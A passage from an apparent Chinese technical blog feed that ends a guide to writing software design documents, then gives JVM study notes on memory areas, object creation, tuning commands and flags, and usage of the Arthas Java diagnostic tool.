<li><p>需求动机以及可能的例子。 如，“（tRPC) 微服务模式正在公司内变得流行，但是缺少一个通用的、封装了常用内部工具及服务接口的微服务框架”。</p>
</li>
<li><ul>
<li>这是放置需求文档的链接的好地方。</li>
</ul>
</li>
<li><p>此前的版本以及它们的问题。 如，“(tRPC) Taf 是之前的应用框架， 有以下特点，…………， 但是有以下局限性及历史遗留问题”。</p>
</li>
<li><p>其它已有方案， 如公司内其它方案或开源方案， “tRPC vs. gRPC vs. Stubby”</p>
</li>
<li><p>相关的项目，如 “tRPC 框架中可能会对接的其它 PCG 系统”</p>
</li>
</ul>
<p>不要在背景中写你的设计，或对问题的解决思路。 </p>
<h2 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a><strong>总体设计</strong></h2><p>“我们如何解决这个问题？”</p>
<p>用一页描述高层设计。</p>
<p>说明系统的主要组成部分，以及一些关键设计决策。该系统应有对应的模块或努力以满足前面所列出的目标。</p>
<p>本设计文档的评审人应该能够根据该总体设计理解你的设计思路并做出评价。</p>
<p>描述应该对一个新的、不在该项目工作的腾讯工程师而言是可以理解的。</p>
<p>推荐使用 <a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%85%B3%E7%B3%BB%E5%9B%BE">系统关系图</a> 描述设计。它可以使读者清晰地了解文中的新系统和已经熟悉的系统间的关系。它也可以包含新系统内部概要的组成模块。</p>
<p>注意：不要只放一个图而不做任何说明，请根据上面小节的要求用文字描述设计思想。</p>
<p>​        <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114819.png" alt="img"></p>
<p>​                 <img src="https://docimg1.docs.qq.com/image/A94XO50A_ONl4b8m_1iZug.png?w=640&h=325" alt="img">        </p>
<p>一个示例系统关系图</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114561.png" alt="image-20211027153643534"></p>
<p>自举的文档结构图</p>
<p>​                 <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212115526.png" alt="img">        </p>
<p>可能不太好的顶层设计</p>
<p>不要在这里描述细节，放在下一章节中； 不要在这里描述背景，放在上一章节中。</p>
<h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a><strong>详细设计</strong></h2><p>在这一节中，除了介绍设计方案的细节，还应该包括在产生最终方案过程中，主要的设计思想及考虑过的权衡（tradeoff）。这一节的结构和内容因设计对象（系统，API，流程等）的不同可以自由决定，可以划分一些小节来更好地组织内容，尽可能以简洁明了的结构阐明整个设计。</p>
<p>不要过多写实现细节。就像我们不推荐添加只是为了说明代码做了什么的注释，我们也不推荐在设计文档中只说明你具体要怎么实现该系统。否则，为什么不直接实现呢？</p>
<p>以下内容可能是实现细节例子，不适合在设计文档中讨论：</p>
<ul>
<li>API 的所有细节</li>
<li>存储系统的 Data Schema</li>
<li>具体代码或伪代码</li>
<li>该系统各模块代码的存放位置、各模块代码的布局</li>
<li>该系统使用的编译器版本</li>
<li>开发规范</li>
</ul>
<p>通常可以包含以下内容（注意，小节的命名可以更改为更清晰体现内容的标题）：</p>
<h3 id="各子模块的设计"><a href="#各子模块的设计" class="headerlink" title="各子模块的设计"></a><strong>各子模块的设计</strong></h3><p>阐明一些复杂模块内部的细节，可以包含一些模块图、流程图来帮助读者理解。可以借助时序图进行展现，如一次调用在各子模块中的运行过程。</p>
<p>每个子模块需要说明自己存在的意义。如无必要，勿添模块。</p>
<p>如果没有特殊情况（例如该设计文档是为了描述并实现一个核心算法），不要在系统设计加入代码或者伪代码。</p>
<h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a><strong>API接口</strong></h3><p>如果设计的系统会暴露 API 接口，那么简要地描述一下API会帮助理解系统的边界。</p>
<p>避免将整个接口复制粘贴到文档中，因为在特定编程语言中的接口通常包含一些语言细节而显得冗长，并且有一些细节也会很快变化。着重表现API接口跟设计最相关的主要部分即可。</p>
<h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a><strong>存储</strong></h3><p>介绍系统依赖的存储设计。该部分内容应该回答以下问题，如果答案并非显而易见：</p>
<ul>
<li><p>该系统对数据&#x2F;存储有哪些要求？ </p>
</li>
<li><ul>
<li>该系统会如何使用数据？</li>
<li>数据是什么类型的？</li>
<li>数据规模有多大？</li>
<li>读写比是多少？读写频率有多高？</li>
<li>对可扩展性是否有要求？</li>
<li>对原子性要求是什么？</li>
<li>对一致性要求是什么？是否需要支持事务？</li>
<li>对可用性要求是什么？</li>
<li>对性能的要求是什么？</li>
<li>…………</li>
</ul>
</li>
<li><p>基于上面的事实，数据库应该如何选型？</p>
</li>
<li><ul>
<li>选用关系型数据库还是非关系型数据库？是否有合适的中间件可以使用？</li>
<li>如何分片？是否需要分库分表？是否需要副本？</li>
<li>是否需要异地容灾？</li>
<li>是否需要冷热分离？</li>
<li>…………</li>
</ul>
</li>
</ul>
<p>如果是关系型数据，可以借助<a href="https://zh.wikipedia.org/wiki/ER%E6%A8%A1%E5%9E%8B">ER图</a>的方式展现数据间的关系。</p>
<p>回答上述问题时，尽可能提供数据，将数据作为答案或作为辅助。 不要回答“数据规模很大，读写频繁”，而是回答“预计数据规模为 300T， 3M 日读出， 0.3M 日写入， 巅峰 QPS 为 300”。这样才能为下一步的具体数据库造型提供详细的决策依据，并让读者信服。</p>
<p>注意：在造型时也要包括可能会造成显著影响的非技术因素，如费用。</p>
<p>避免将所有数据定义（data schema）复制粘贴到文档中，因为 data schema 更偏实现细节。</p>
<h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a><strong>其他方案</strong></h2><p>“我们为什么不这么解决这个问题？”</p>
<p>在介绍了最终方案后，可以有一节介绍一下设计过程中考虑过的其他设计方案（Alternatives Considered）、它们各自的优缺点和权衡点、以及导致选择最终方案的原因等。通常，有经验的读者（尤其是方案的审阅者）会很自然地想到一些其他设计方案，如果这里的介绍描述了没有选择这些方案的原因，就避免读者带着疑问看完整个设计再来询问作者。这一节可以体现设计的严谨性和全面性。</p>
<h2 id="交叉关注点"><a href="#交叉关注点" class="headerlink" title="交叉关注点"></a><strong>交叉关注点</strong></h2><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a><strong>基础设施</strong></h3><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a><strong>安全</strong></h3><h3 id="隐私"><a href="#隐私" class="headerlink" title="隐私"></a><strong>隐私</strong></h3><h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a><strong>延迟</strong></h3><h3 id="冗余-amp-可靠性"><a href="#冗余-amp-可靠性" class="headerlink" title="冗余 &amp; 可靠性"></a><strong>冗余 &amp; 可靠性</strong></h3><p>是否需要容灾？是否需要过载保护、有损降级、接口熔断、轻重分离？</p>
<h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a><strong>数据完整性</strong></h3><h2 id="实现计划"><a href="#实现计划" class="headerlink" title="实现计划"></a><strong>实现计划</strong></h2><p>描述时间及人力安排，如里程碑。 这利于相关人员了解预期，调整工作计划。</p>
<h2 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a><strong>未来计划</strong></h2><p>未来可能的计划会方便读者更好地理解该设计以及其定位。</p>
<p>我们确实应该把设计限定在当前问题，但是该设计可能是更高层系统所要解决问题的一部分，或者只是阶段性方案。 读者可能会对方案的完整性有所疑问，会质疑到底问题是否得到完整解决，甚至会质疑该问题在更高层的系统中是否确实值得解决。 “背景（过去）– 当前方案 – 未来计划” 三者的结合会为读者提供更好的全景图。</p>
<h1 id="附录：-参考文献"><a href="#附录：-参考文献" class="headerlink" title="附录： 参考文献"></a><strong>附录： 参考文献</strong></h1><p>参考文档：</p>
<ul>
<li><a href="https://km.woa.com/group/40176/articles/show/440739?from=iSearch">如何编写软件工程设计文档</a> </li>
<li><a href="https://www.industrialempathy.com/posts/design-docs-at-google/">Design Docs at Google</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFNzc05YelNhZldx">模板] 设计文档模板</a></li>
<li>[<a href="https://docs.qq.com/doc/DUWlxc1pmdllZeEtL">示例] 视频关系网络工程设计文档</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFduSnV4RmhIZHB5">示例] 视频后台组件平台-总体设计</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">示例] Unionplus K-List存储设计替代方案</a></li>
<li><a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">Unionplus K-List存储设计替代方案</a><a href="https://www.chromium.org/developers/design-documents">chromium 设计文档实例</a></li>
</ul>
<p>参考书籍：</p>
<ul>
<li><a href="https://book.douban.com/subject/20062380/">Style</a>, <em>Joseph M. Williams &#x2F; Joseph Bizup</em></li>
<li><a href="https://book.douban.com/subject/1020644/">金字塔原理 : 思考、写作和解决问题的逻辑</a>, <em>巴巴拉·明托</em></li>
<li><a href="https://book.douban.com/subject/3888123/">写作这回事</a>，<em>斯蒂芬·金</em></li>
<li><a href="https://book.douban.com/subject/1433835/">The elements of style,</a> <em>William Strunk Jr. &#x2F; E. B. White</em></li>
<li><a href="https://www.goodreads.com/en/book/show/44144493-fundamentals-of-software-architecture">Fundamentals of Software Architecture</a>, <em>Mark Richards &#x2F; Neal Ford</em></li>
<li><a href="https://book.douban.com/subject/34875994/">Software engineering at Google</a>, <em>Titus Winters &#x2F; Tom Manshreck &#x2F; Hyrum K. Wright</em></li>
<li><a href="https://book.douban.com/subject/35143751/">写作是门手艺</a>，<em>刘军强</em></li>
</ul>
]]></content>
      <categories>
        <category>设计文档</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM</title>
    <url>/2022/03/17/JVM/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848716.png" alt="image-20210508171931448"></p>
<h2 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h2><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="JVM运行时数据区域" style="zoom:80%;" />

<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848700.png" alt="Java运行时数据区域JDK1.8" style="zoom:80%;" />



<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><ul>
<li>JDK 7 新生代、老年代和永久代；jdk8 永久代被移除，用元空间代替，元空间使用的是直接内存；</li>
<li>对象初始年龄为1，到了15会去老年代；</li>
</ul>
<p>OutOfMemoryError: GC Overhead Limit Exceeded：当JVM花太多时间执行垃圾回收并且只能回收很少的堆空间时，就会发生此错误；</p>
<p>java.lang.OutOfMemoryError: Java heap space：假如在创建新的对象时，堆内存中的空间不足以存放新创建的对象，就会引发java.lang.OutOfMemoryError： Java heap space 错误。(和本机物理内存无关，和你配置的内存大小有关！)</p>
<h3 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h3><ul>
<li>为永久代；线程共享；</li>
<li>存储已被虚拟机加载的类信息、常量、静态变量（即时编译器编译后的代码等数据）；</li>
<li>方法区和永久代的关系很像 Java 中接口和类的关系，类实现了接口，而永久代就是 HotSpot 虚拟机对虚拟机规范中方法区的一种实现方式；</li>
</ul>
<h4 id="为什么要将永久代-PermGen-替换为元空间-MetaSpace"><a href="#为什么要将永久代-PermGen-替换为元空间-MetaSpace" class="headerlink" title="为什么要将永久代(PermGen)替换为元空间(MetaSpace)?"></a>为什么要将永久代(PermGen)替换为元空间(MetaSpace)?</h4><ul>
<li>整个永久代有一个 JVM 本身设置固定大小上限，无法进行调整，而元空间使用的是直接内存，受本机可用内存的限制，虽然元空间仍旧可能溢出，但是比原来出现的几率会更小；java.lang.OutOfMemoryError: MetaSpace； </li>
<li>元空间里面存放的是类的元数据，这样加载多少类的元数据就不由 MaxPermSize 控制了，而由系统的实际可用空间来控制，这样能加载的类就更多了；在 JDK8，合并 HotSpot 和 JRockit 的代码时，JRockit 从来没有一个叫永久代的东西，合并之后就没有必要额外的设置这么一个永久代的地方了。</li>
</ul>
<h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><ul>
<li>运行时常量池是方法区的一部分；</li>
<li>JDK1.7之前运行时常量池逻辑包含字符串常量池存放在方法区，此时hotspot虚拟机对方法区的实现为永久代；</li>
<li>JDK1.7 字符串常量池被从方法区拿到了堆中，这里没有提到运行时常量池，也就是说字符串常量池被单独拿到堆，运行时常量池剩下的东西还在方法区， 也就是hotspot中的永久代 <strong>; JDK1.8 hotspot移除了永久代用元空间(Metaspace)取而代之， 这时候字符串常量池还在堆， 运行时常量池还在方法区， 只不过方法区的实现从永久代变成了元空间(Metaspace);</strong></li>
</ul>
<h4 id="JVM-常量池中存储的是对象还是引用呢？"><a href="#JVM-常量池中存储的是对象还是引用呢？" class="headerlink" title="JVM 常量池中存储的是对象还是引用呢？"></a>JVM 常量池中存储的是对象还是引用呢？</h4><p>如果是runtime constant pool（而不是interned string pool &#x2F; StringTable之类的其他东西）的话，其中的引用类型常量（例如CONSTANT_String、CONSTANT_Class、CONSTANT_MethodHandle、CONSTANT_MethodType之类）都存的是引用，实际的对象还是存在Java heap上的。</p>
<h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>类加载检查: 虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p>
<p>分配内存: 指针碰撞:内存规整的情况下，GC收集器Serial，Parnew;空闲列表:堆内存不规整的情况下，CMS; 多线程下用CAS+失败重试;TLAB，为每一个线程预先在 Eden 区分配一块儿内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配;</p>
<p>初始化零值:内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p>
<p>设置对象头:初始化零值完成之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 这些信息存放在对象头中。 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p>
<p>执行init方法: 在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<init>方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <init> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p>
<h2 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" title="对象的访问定位"></a>对象的访问定位</h2><p>句柄和直接指针;使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而 reference 本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销;</p>
<h2 id="JVM常用调优指令和参数"><a href="#JVM常用调优指令和参数" class="headerlink" title="JVM常用调优指令和参数"></a>JVM常用调优指令和参数</h2><h3 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h3><p>查询正在运行的JVM进程；</p>
<h3 id="jstat"><a href="#jstat" class="headerlink" title="jstat"></a>jstat</h3><p>可以实时显示本地或远程JVM进程中类装载、内存、垃圾收集、JIT编译等数据；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-class             // 显示类加载信息</span><br><span class="line">-compiler          // 显示编译信息</span><br><span class="line">-gc                // 显示GC相关信息</span><br><span class="line">-gccapacity        // 显示各区域容量及使用情况</span><br><span class="line">-gccause           // 显示垃圾回收信息</span><br><span class="line">-gcmetacapacity    // 显示元空间容量信息</span><br><span class="line">-gcnew             // 显示新生代信息</span><br><span class="line">-gcnewcapacity     // 显示新生代容量信息</span><br><span class="line">-gcold             // 显示老年代信息</span><br><span class="line">-gcoldcapacity     // 显示老年代容量信息</span><br><span class="line">-gcutil            // 显示垃圾收集信息</span><br><span class="line">-printcompilation  // 显示JIT编译的方法信息</span><br><span class="line"></span><br><span class="line">jstat -gcutil 20272 2s 3</span><br><span class="line"></span><br><span class="line">jstat -gc 20272 2s 3</span><br></pre></td></tr></table></figure>



<p>S0C：第一个幸存者区（Survivor Space）容量</p>
<p>S1C：第二个幸存者区（Survivor Space）容量</p>
<p>S0U：第二个幸存者区使用量</p>
<p>S1U：第二个幸存者区使用量</p>
<p>EC：伊甸园去容量</p>
<p>EU：伊甸园区使用量</p>
<p>OC：Old Generation区容量</p>
<p>OU：Old Generation使用量</p>
<p>MC：Mataspace区容量</p>
<p>MU：Mataspace区实际使用量</p>
<p>CCSC：压缩类空间大小（不是很懂，先标记一下）</p>
<p>CCSU：压缩类空间使用率（不是很懂，先标记一下）</p>
<p>YGC：年轻代垃圾回收次数</p>
<p>YGCT：年轻代垃圾回收时间</p>
<p>FGC：年老代垃圾回收次数</p>
<p>FGCT：年老代垃圾回收时间</p>
<p>GCT：总垃圾回收时间</p>
<p>S0：S0C区域使用率</p>
<p>S0：S1C区域使用率</p>
<p>E：伊甸园去使用率</p>
<p>O：Old Generation使用率，OU&#x2F;OC</p>
<p>M：Matespace区使用率，MU&#x2F;MC</p>
<p>CCS：压缩类空间使用率</p>
<h3 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h3><p>用于查询当前运行这的JVM属性和参数的值；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jinfo 4777</span><br></pre></td></tr></table></figure>

<h3 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h3><p>显示当前Java堆和永久代的详细信息；</p>
<p>命令jmap是一个多功能的命令。它可以生成 java 程序的 dump 文件，生成dump的命令为：jmap -dump:live，format&#x3D;b，file&#x3D;文文件名(hprof后缀) &lt;PID&gt; 也可以查看堆内对象示例的统计信息、查看 ClassLoader 的信息以及 finalizer 队列。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某一实例jvm配置</span></span><br><span class="line">jmap  -heap 29544</span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<h3 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h3><p>用于生成当前JVM的所有线程快照，线程快照是虚拟机每一条线程正在执行的方法，目的是定位线程出现长时间停顿的原因。</p>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>通过top -Hp 23344可以查看该进程下各个线程的cpu使用情况；具体实操经验见：<a href="https://www.cnblogs.com/wuchanming/p/7766994.html">https://www.cnblogs.com/wuchanming/p/7766994.html</a></p>
<h3 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h3><p>实时查看一个进程的CPU使用情况及上下文切换情况</p>
<h3 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h3><p>查看总体的CPU使用情况 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">參数2表示每一个2秒显示一下结果，3表示显示结果的数目。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs列表示每秒上下文切换次数，us表示用户CPU时间。</span></span><br><span class="line">sudo vmstat 2 3</span><br></pre></td></tr></table></figure>



<h3 id="JVM常见的调优参数"><a href="#JVM常见的调优参数" class="headerlink" title="JVM常见的调优参数"></a>JVM常见的调优参数</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定java程序的最大堆内存， 使用java -Xmx5000M -version判断当前系统能分配的最大堆内存。</span></span><br><span class="line">-Xmx</span><br><span class="line"><span class="comment"># 指定最小堆内存， 通常设置成跟最大堆内存一样，减少GC。</span></span><br><span class="line">-Xms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置年轻代大小。整个堆大小=年轻代大小 + 年老代大小。所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3/8。</span></span><br><span class="line">-Xmn</span><br><span class="line"><span class="comment"># 指定线程的最大栈空间， 此参数决定了java函数调用的深度， 值越大调用深度越深， 若值太小则容易出栈溢出错误（StackOverflowError）。</span></span><br><span class="line">-Xss</span><br><span class="line"><span class="comment"># 指定方法区(永久区)的初始值，默认是物理内存的1/64， 在Java8永久区移除， 代之的是元数据区， 由-XX:MetaspaceSize指定。</span></span><br><span class="line">-XX:PermSize</span><br><span class="line"><span class="comment"># 指定方法区的最大值， 默认是物理内存的1/4，在java8中由-XX:MaxMetaspaceSize指定元数据区的大小。</span></span><br><span class="line">-XX:MaxPermSize</span><br><span class="line"><span class="comment"># 老年代与年轻代的比值，-XX:NewRatio=2， 表示年老代与年轻代的比值为2:1。</span></span><br><span class="line">-XX:NewRatio=n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Eden区与Survivor区的大小比值，-XX:SurvivorRatio=8表示Eden区与Survivor区的大小比值是8:1:1，因为Survivor区有两个（from， to）</span></span><br><span class="line">-XX:SurvivorRatio=8 </span><br><span class="line"><span class="comment"># 最大堆内存为20m， 最小堆内存为5m， 通常设置为和最大一样，减少GC</span></span><br><span class="line">-Xmx20m -Xms5m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=你要输出的日志路径</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印gc信息</span></span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line"><span class="comment"># 偏向锁开启时间</span></span><br><span class="line">-XX:BaisedLockingStartupDelay=0</span><br><span class="line"><span class="comment"># 不使用偏向锁</span></span><br><span class="line">-XX:-UseBiasedLocking=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要是控制新生代需要经历多少次GC晋升到老年代中的最大阈值; Tenuring Threshold[ˈθreʃhəʊld]终身监禁的门槛</span></span><br><span class="line">-XX:MaxTenuringThreshold=15; </span><br><span class="line"><span class="comment"># 设置 Metaspace 的初始（以及最小大小）</span></span><br><span class="line">-XX:MetaspaceSize=N </span><br><span class="line"><span class="comment"># 设置 Metaspace 的最大大小</span></span><br><span class="line">-XX:MaxMetaspaceSize=N </span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认为混合模式 开始解释执行，启动速度较快，对热点代码执行检测和编译</span></span><br><span class="line">-Xmixed </span><br><span class="line"><span class="comment"># 使用解释模式，启动很快，执行稍慢</span></span><br><span class="line">-Xint</span><br><span class="line"><span class="comment"># 使用纯编译编译模式，执行很快，启动很慢</span></span><br><span class="line">-Xcomp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Jprofiler</p>
<p>分析内存dump文件，快速定位内存泄漏</p>
<h3 id="arthas"><a href="#arthas" class="headerlink" title="arthas"></a>arthas</h3><p>Alibaba开源的Java诊断工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O https://arthas.aliyun.com/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

<h4 id="help"><a href="#help" class="headerlink" title="help"></a>help</h4><h4 id="dashboard"><a href="#dashboard" class="headerlink" title="dashboard"></a>dashboard</h4><p>命令可以查看当前系统的实时数据面板 输入Q或者 Ctrl+C 可以退出dashboard命令。</p>
<h4 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h4><p><code>thread 1</code> 命令会打印线程ID 1的栈。</p>
<p>Arthas支持管道，可以用 <code>thread 1 | grep &#39;main(&#39;</code> 查找到<code>main class</code>。</p>
<h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>可以通过 <code>sc</code> 命令来查找JVM里已加载的类：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sc -d *MathGame</span><br></pre></td></tr></table></figure>

<h4 id="jad"><a href="#jad" class="headerlink" title="jad"></a>jad</h4><p>可以通过 <code>jad</code> 命令来反编译代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jad demo.MathGame</span><br></pre></td></tr></table></figure>



<h4 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h4><p>通过<code>watch</code>命令可以查看函数的参数&#x2F;返回值&#x2F;异常信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watch demo.MathGame primeFactors returnObj</span><br></pre></td></tr></table></figure>

<p>输入 <code>Q</code> 或者 <code>Ctrl+C</code> 退出watch命令。</p>
<h4 id="vmtool"><a href="#vmtool" class="headerlink" title="vmtool"></a>vmtool</h4><p>通过<code>vmtool</code>命令，可以搜索内存对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmtool --action getInstances --className java.lang.String --limit 10</span><br></pre></td></tr></table></figure>

<h4 id="查看JVM信息"><a href="#查看JVM信息" class="headerlink" title="查看JVM信息"></a>查看JVM信息</h4><p>下面介绍Arthas里查看<code>JVM</code>信息的命令。</p>
<h5 id="sysprop"><a href="#sysprop" class="headerlink" title="sysprop"></a>sysprop</h5><p><code>sysprop</code> 可以打印所有的System Properties信息。</p>
<p>也可以指定单个key： <code>sysprop java.version</code></p>
<p>也可以通过<code>grep</code>来过滤： <code>sysprop | grep user</code></p>
<p>可以设置新的value： <code>sysprop testKey testValue</code></p>
<h5 id="sysenv"><a href="#sysenv" class="headerlink" title="sysenv"></a>sysenv</h5><p><code>sysenv</code> 命令可以获取到环境变量。和<code>sysprop</code>命令类似。</p>
<h5 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h5><p><code>jvm</code> 命令会打印出<code>JVM</code>的各种详细信息。</p>
<h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>为了更好使用Arthas，下面先介绍Arthas里的一些使用技巧。</p>
<h4 id="help-1"><a href="#help-1" class="headerlink" title="help"></a>help</h4><p>Arthas里每一个命令都有详细的帮助信息。可以用<code>-h</code>来查看。帮助信息里有<code>EXAMPLES</code>和<code>WIKI</code>链接。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysprop -h</span><br></pre></td></tr></table></figure>

<h5 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h5><p>Arthas支持丰富的自动补全功能，在使用有疑惑时，可以输入<code>Tab</code>来获取更多信息。</p>
<p>比如输入 <code>sysprop java.</code> 之后，再输入<code>Tab</code>，会补全出对应的key：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sysprop java.</span><br><span class="line">java.runtime.name             java.protocol.handler.pkgs    java.vm.version</span><br><span class="line">java.vm.vendor                java.vendor.url               java.vm.name</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="readline的快捷键支持"><a href="#readline的快捷键支持" class="headerlink" title="readline的快捷键支持"></a>readline的快捷键支持</h5><p>Arthas支持常见的命令行快捷键，比如<code>Ctrl + A</code>跳转行首，<code>Ctrl + E</code>跳转行尾。</p>
<p>更多的快捷键可以用 <code>keymap</code> 命令查看。</p>
<h5 id="历史命令的补全"><a href="#历史命令的补全" class="headerlink" title="历史命令的补全"></a>历史命令的补全</h5><p>如果想再执行之前的命令，可以在输入一半时，按<code>Up/↑</code> 或者 <code>Ddown/↓</code>，来匹配到之前的命令。</p>
<p>比如之前执行过<code>sysprop java.version</code>，那么在输入<code>sysprop ja</code>之后，可以输入<code>Up/↑</code>，就会自动补全为<code>sysprop java.version</code>。</p>
<p>如果想查看所有的历史命令，也可以通过 <code>history</code> 命令查看到。</p>
<h5 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h5><p>Arthas支持在pipeline之后，执行一些简单的命令，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysprop | grep java</span><br><span class="line">sysprop | wc -l</span><br></pre></td></tr></table></figure>

<h4 id="sc-x2F-sm-查看已加载的类"><a href="#sc-x2F-sm-查看已加载的类" class="headerlink" title="sc&#x2F;sm 查看已加载的类"></a>sc&#x2F;sm 查看已加载的类</h4><p>下面介绍Arthas里查找已加载类的命令。</p>
<h5 id="sc-1"><a href="#sc-1" class="headerlink" title="sc"></a>sc</h5><p><code>sc</code> 命令可以查找到所有JVM已经加载到的类。</p>
<p>如果搜索的是接口，还会搜索所有的实现类。比如查看所有的<code>Filter</code>实现类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc javax.servlet.Filter</span><br></pre></td></tr></table></figure>

<p>通过<code>-d</code>参数，可以打印出类加载的具体信息，很方便查找类加载问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc -d javax.servlet.Filter</span><br></pre></td></tr></table></figure>

<p><code>sc</code>支持通配，比如搜索所有的<code>StringUtils</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc *StringUtils</span><br></pre></td></tr></table></figure>

<h5 id="sm"><a href="#sm" class="headerlink" title="sm"></a>sm</h5><p><code>sm</code>命令则是查找类的具体函数。比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm java.math.RoundingMode</span><br></pre></td></tr></table></figure>

<p>通过<code>-d</code>参数可以打印函数的具体属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm -d java.math.RoundingMode</span><br></pre></td></tr></table></figure>

<p>也可以查找特定的函数，比如查找构造函数：</p>
